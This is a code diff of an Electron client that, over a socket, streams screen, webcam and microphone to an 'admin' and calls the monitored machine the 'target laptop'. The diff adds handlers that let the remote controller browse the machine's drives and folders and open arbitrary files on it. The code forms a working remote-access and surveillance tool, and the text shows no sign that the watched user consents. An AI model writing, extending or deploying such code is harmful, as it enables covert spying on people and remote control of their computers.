@@ -9,13 +9,13 @@ let socket;
 let localScreenStream;
 let localCameraStream;
 let peerConnection;
-const configuration = { 
+const configuration = {
     iceServers: [
         { urls: 'stun:stun.l.google.com:19302' },
         { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject', credential: 'openrelayproject' },
         { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'openrelayproject' },
         { urls: 'turn:openrelay.metered.ca:443?transport=tcp', username: 'openrelayproject', credential: 'openrelayproject' }
-    ] 
+    ]
 };
 let iceCandidatesQueue = [];
 let screenInterval = null;
@@ -80,7 +80,7 @@ window.onload = async () => {
             try {
                 localCameraStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                 setupWebRTC(adminId, localCameraStream);
-            } catch(camErr) {
+            } catch (camErr) {
                 console.log("No Camera/Mic found or access denied.");
                 socket.emit('client-error', "Camera not found on target laptop.");
             }
@@ -92,10 +92,32 @@ window.onload = async () => {
             try {
                 localCameraStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
                 setupWebRTC(adminId, localCameraStream);
-            } catch(camErr) {
+            } catch (camErr) {
                 console.log("No Mic found or access denied.");
                 socket.emit('client-error', "Mic not found on target laptop.");
             }
+        });
+
+        // Handle File Browser Request
+        socket.on('request-files', async (data) => {
+            const targetPath = data.path;
+            if (!targetPath) {
+                const drives = await window.electronAPI.getDrives();
+                const driveItems = drives.map(d => ({ name: d, path: d, isDirectory: true, size: 0 }));
+                socket.emit('file-list', { targetId: data.from, path: '', files: driveItems });
+            } else {
+                const result = await window.electronAPI.readDirectory(targetPath);
+                if (result.error) {
+                    socket.emit('file-list', { targetId: data.from, path: targetPath, error: result.error });
+                } else {
+                    socket.emit('file-list', { targetId: data.from, path: targetPath, files: result });
+                }
+            }
+        });
+
+        // Handle Open File Execution
+        socket.on('open-file', async (filePath) => {
+            await window.electronAPI.openFile(filePath);
         });
 
         // Helper function to setup WebRTC
@@ -118,10 +140,10 @@ window.onload = async () => {
         }
 
         socket.on('answer', async (data) => {
-            if(!peerConnection) return;
+            if (!peerConnection) return;
             await peerConnection.setRemoteDescription(new RTCSessionDescription(data.answer));
             for (let candidate of iceCandidatesQueue) {
-                try { await peerConnection.addIceCandidate(new RTCIceCandidate(candidate)); } catch (err) {}
+                try { await peerConnection.addIceCandidate(new RTCIceCandidate(candidate)); } catch (err) { }
             }
             iceCandidatesQueue = [];
         });
@@ -129,7 +151,7 @@ window.onload = async () => {
         socket.on('ice-candidate', async (data) => {
             if (peerConnection) {
                 if (peerConnection.remoteDescription) {
-                    try { await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate)); } catch (err) {}
+                    try { await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate)); } catch (err) { }
                 } else {
                     iceCandidatesQueue.push(data.candidate);
                 }
@@ -137,44 +159,44 @@ window.onload = async () => {
         });
 
         socket.on('stop-screen', () => {
-             console.log("Stopping screen share");
-             if (screenInterval) clearInterval(screenInterval);
-             if (localScreenStream) {
-                 localScreenStream.getTracks().forEach(t => t.stop());
-                 localScreenStream = null;
-             }
+            console.log("Stopping screen share");
+            if (screenInterval) clearInterval(screenInterval);
+            if (localScreenStream) {
+                localScreenStream.getTracks().forEach(t => t.stop());
+                localScreenStream = null;
+            }
         });
 
         socket.on('stop-camera', stopWebRTCStream);
         socket.on('stop-mic', stopWebRTCStream);
 
         function stopWebRTCStream() {
-             console.log("Stopping WebRTC Stream (Camera/Mic)");
-             if (localCameraStream) {
-                 localCameraStream.getTracks().forEach(t => t.stop());
-                 localCameraStream = null;
-             }
-             if (peerConnection) {
-                 peerConnection.close();
-                 peerConnection = null;
-             }
+            console.log("Stopping WebRTC Stream (Camera/Mic)");
+            if (localCameraStream) {
+                localCameraStream.getTracks().forEach(t => t.stop());
+                localCameraStream = null;
+            }
+            if (peerConnection) {
+                peerConnection.close();
+                peerConnection = null;
+            }
         }
 
         socket.on('stop-watch', () => {
-             console.log("Stopping all");
-             if (screenInterval) clearInterval(screenInterval);
-             if (localScreenStream) {
-                 localScreenStream.getTracks().forEach(t => t.stop());
-                 localScreenStream = null;
-             }
-             if (localCameraStream) {
-                 localCameraStream.getTracks().forEach(t => t.stop());
-                 localCameraStream = null;
-             }
-             if (peerConnection) {
-                 peerConnection.close();
-                 peerConnection = null;
-             }
+            console.log("Stopping all");
+            if (screenInterval) clearInterval(screenInterval);
+            if (localScreenStream) {
+                localScreenStream.getTracks().forEach(t => t.stop());
+                localScreenStream = null;
+            }
+            if (localCameraStream) {
+                localCameraStream.getTracks().forEach(t => t.stop());
+                localCameraStream = null;
+            }
+            if (peerConnection) {
+                peerConnection.close();
+                peerConnection = null;
+            }
         });
     };
 
